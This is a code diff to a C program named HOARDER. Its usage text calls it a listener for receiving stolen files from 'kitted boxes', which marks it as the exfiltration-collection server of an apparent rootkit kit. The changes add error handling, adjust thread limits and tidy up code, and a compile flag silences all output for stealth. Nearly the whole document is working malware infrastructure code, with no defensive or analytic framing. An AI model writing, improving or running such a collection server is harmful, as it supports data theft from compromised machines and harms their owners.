@@ -47,13 +47,10 @@ struct cloneargs{
     char path[PATH_MAX];
 };
 
-static int tids = 0, sockind = 0;
-static int activesocks[MAX_THREADS];
+static int tids = 0, sockind = 0, activesocks[MAX_THREADS];
 static fd_set readfds;
 static pthread_t tid[MAX_THREADS];
 static pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;
-
-#define fset(fd) FD_ISSET(fd, &readfds)
 
 void berror(char *s){
 #ifndef TOTALLY_SILENT_HOARD
@@ -116,7 +113,7 @@ void *takefile(void *arg){
     char *outdir = args->path;
 
     char infobuf[2], goodinfo[4096], p, tmp[2];
-    int n=0, c=0, statr, t;
+    int n=0, c=0, statr, t, cr;
     off_t fsize, i=0;
     char *path, *bname, *dupdup, *ptmp;
     uid_t uid;
@@ -190,9 +187,15 @@ void *takefile(void *arg){
     }
 
     ptmp = pathtmp(newpath);
-    creat(ptmp, 0600);
+    cr = creat(ptmp, 0600);
+    if(cr < 0){
+        berror("creat");
+        goto nopenope;
+    }else close(cr);
+
     while(read(sockfd, tmp, 1) > 0 && i++<fsize)
         fputc(tmp[0], fp);
+nopenope:
     shutdown(sockfd, SHUT_RDWR);
     close(sockfd);
     fclose(fp);
@@ -208,12 +211,6 @@ void *takefile(void *arg){
     pthread_exit(NULL);
 }
 
-void clearsocks(void){
-    for(int i=0; i<MAX_THREADS; i++)
-        if(activesocks[i] != 0)
-            activesocks[i] = 0;
-}
-
 int numthreads(void){
     int c=0;
     for(int i=0; i<MAX_THREADS; i++)
@@ -222,20 +219,23 @@ int numthreads(void){
 }
 
 int main(int argc, char *argv[]){
-    char cwd[4096];
-    getcwd(cwd, sizeof(cwd));
+    char cwd[PATH_MAX];
+    if(getcwd(cwd, sizeof(cwd)-1) == NULL){
+        perror("getcwd");
+        return -1;
+    }
 
     if(argc < 2){
-        printf(" ~ \e[1;31mHOARDER\e[0m ~ \n\n");
+        printf("\n \e[1m~\e[0m \e[1;31mHOARDER\e[0m \e[1m~\e[0m \n\n");
         printf(" Usage: %s <port> [output directory]\n", argv[0]);
         printf("  Sets up a small listener for receiving stolen files\n");
         printf("  from your kitted boxes.\n\n");
-        printf(" Default output directory: . (%s)\n", cwd);
+        printf(" Default output directory: . (%s)\n\n", cwd);
         return -1;
     }
 
     unsigned short port;
-    struct sockaddr_in sa, *sap;
+    struct sockaddr_in sa;
     struct in_addr addr;
     struct cloneargs args;
     socklen_t len;
@@ -287,20 +287,19 @@ int main(int argc, char *argv[]){
         FD_SET(masterfd, &readfds);
 
         threads = numthreads();
-        if(tids >= MAX_THREADS || sockind >= MAX_THREADS || threads >= MAX_THREADS){
-            if(threads >= MAX_THREADS){
+        if(tids >= MAX_THREADS-1 || sockind >= MAX_THREADS-1 || threads >= MAX_THREADS-1){
+            if(threads >= MAX_THREADS-1){
 #ifndef TOTALLY_SILENT_HOARD
                 printf("Max threads reached. Waiting...\n");
 #endif
                 for(int i=0; i < MAX_THREADS; i++){
                     int asock = activesocks[i];
-                    if(fset(asock)) pthread_join(tid[i], NULL);
+                    if(FD_ISSET(asock, &readfds))
+                        pthread_join(tid[i], NULL);
                 }
             }
             tids=0, sockind=0;
         }
-
-        if(!fset(masterfd)) continue;
 
         len = sizeof(sa);
         newsock = accept(masterfd, (struct sockaddr*)&sa, &len);
@@ -309,9 +308,7 @@ int main(int argc, char *argv[]){
             continue;
         }
 
-        sap = (struct sockaddr_in*)&sa;
-        addr = sap->sin_addr;
-
+        addr = sa.sin_addr;
         memset(addrstr, 0, sizeof(addrstr));
         inet_ntop(AF_INET, &addr, addrstr, 16);
 
